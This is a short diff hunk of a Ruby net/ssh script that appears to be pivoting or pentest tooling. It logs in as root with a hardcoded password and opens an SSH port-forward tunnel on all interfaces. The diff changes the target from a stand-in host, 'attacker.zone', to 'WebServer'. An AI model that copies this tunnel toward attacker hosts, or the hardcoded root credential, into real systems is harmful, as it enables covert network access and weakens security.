@@ -56,7 +56,7 @@ require 'net/ssh'
 
 Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|
   # Forward connections coming on port 2222 to port 22 of attacker.zone
-  ssh.forward.local('0.0.0.0', 2222, "attacker.zone", 22)
+  ssh.forward.local('0.0.0.0', 2222, "WebServer", 22)
   
   puts "[+] Starting SSH port forward tunnel"
   ssh.loop { true }
